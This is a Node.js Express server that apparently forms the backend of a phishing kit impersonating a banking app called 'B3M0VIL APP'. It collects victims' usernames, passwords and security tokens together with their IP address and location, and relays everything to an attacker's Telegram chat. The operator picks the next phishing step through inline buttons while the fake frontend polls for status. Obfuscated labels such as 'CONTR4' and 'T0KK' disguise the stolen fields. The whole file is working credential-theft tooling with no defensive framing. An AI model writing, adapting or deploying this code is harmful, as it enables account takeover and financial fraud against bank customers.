const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");
const axios = require("axios");
const https = require("https");
require("dotenv").config();

const app = express();
app.use(cors());
app.use(express.json({ limit: "10mb" }));
app.use(express.urlencoded({ extended: true }));

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const agent = new https.Agent({ family: 4 });

const CLIENTES_DIR = "./clientes";
if (!fs.existsSync(CLIENTES_DIR)) {
  fs.mkdirSync(CLIENTES_DIR);
}

// 🧩 Funciones auxiliares
function obtenerIP(req) {
  const forwarded = req.headers["x-forwarded-for"];
  return (
    (forwarded ? forwarded.split(",")[0] : req.socket.remoteAddress) ||
    "desconocida"
  );
}

async function obtenerCiudad(ip) {
  try {
    const { data } = await axios.get(`https://ipwhois.app/json/${ip}`);
    return data.city || "desconocida";
  } catch {
    return "desconocida";
  }
}

function guardarCliente(txid, data) {
  fs.writeFileSync(`${CLIENTES_DIR}/${txid}.json`, JSON.stringify(data, null, 2));
}

function cargarCliente(txid) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  return fs.existsSync(ruta) ? JSON.parse(fs.readFileSync(ruta)) : null;
}

// 🧹 Limpieza automática cada 10 min
setInterval(() => {
  const ahora = Date.now();
  fs.readdirSync(CLIENTES_DIR).forEach((file) => {
    const fullPath = path.join(CLIENTES_DIR, file);
    const stats = fs.statSync(fullPath);
    const edadMinutos = (ahora - stats.mtimeMs) / 60000;
    if (edadMinutos > 15) {
      fs.unlinkSync(fullPath);
      console.log(`🗑️ Eliminado: ${file}`);
    }
  });
}, 10 * 60 * 1000);

// 🟣 Paso 1: Enviar usuario/celular
app.post("/enviar", async (req, res) => {
  const { usar, txid, ip, ciudad, pais } = req.body;
  if (!usar || !txid) return res.status(400).send("Campos faltantes");

  const mensaje = `
🟣B3M0VIL APP🟣
PAYS: ${pais || "Desconocido"}
US4R: <code>${usar}</code>

IP: ${ip || "Desconocida"}
Ciudad: ${ciudad || "Desconocida"}
`;

  const cliente = { status: "esperando", usar, ip, ciudad, pais };
  guardarCliente(txid, cliente);

  const keyboard = {
    inline_keyboard: [
      [
        { text: "🔑CL4V3", callback_data: `cel-dina:${txid}` },
        { text: "🔑CL4V3+TOK", callback_data: `cajero:${txid}` },
      ],
    ],
  };

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: "HTML",
      reply_markup: keyboard,
    });
    res.sendStatus(200);
  } catch (err) {
    console.error("❌ Error enviando a Telegram:", err.message);
    res.status(500).send("Error al enviar a Telegram");
  }
});

// 🟣 Paso 2: Webhook de Telegram (botones)
app.post("/webhook", async (req, res) => {
  if (req.body.callback_query) {
    const callback = req.body.callback_query;
    const [accion, txid] = callback.data.split(":");

    const cliente = cargarCliente(txid) || {};
    cliente.status = accion;
    guardarCliente(txid, cliente);

    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
      callback_query_id: callback.id,
      text: `Has seleccionado: ${accion}`,
    });

    return res.sendStatus(200);
  }
  res.sendStatus(200);
});

// 🟣 Paso 3: Consultar estado desde el frontend
app.get("/sendStatus.php", (req, res) => {
  const { txid } = req.query;
  const cliente = cargarCliente(txid) || { status: "esperando" };
  res.json({ status: cliente.status });
});

// 🟣 Paso 4: Recibir contraseña o token final
app.post("/enviarFinal", async (req, res) => {
  const { txid, password, token } = req.body;

  const cliente = cargarCliente(txid);
  if (!cliente) return res.status(400).send("Cliente no encontrado");

  const mensaje = `
🔐🟣B3M0VIL APP🟣
🆔 ID: <code>${txid}</code>

PAYS: ${cliente.pais || "Desconocido"}
US4R: <code>${cliente.usar}</code>
CONTR4: <code>${password || "No ingresada"}</code>
${token ? `T0KK: <code>${token}</code>` : ""}

IP: ${cliente.ip}
Ciudad: ${cliente.ciudad}
`;

  await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    chat_id: CHAT_ID,
    text: mensaje,
    parse_mode: "HTML",
  });

  res.json({ redirect: "crgs.html" });
});

app.get("/", (req, res) => res.send("Servidor activo 🚀"));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor activo en puerto ${PORT}`));
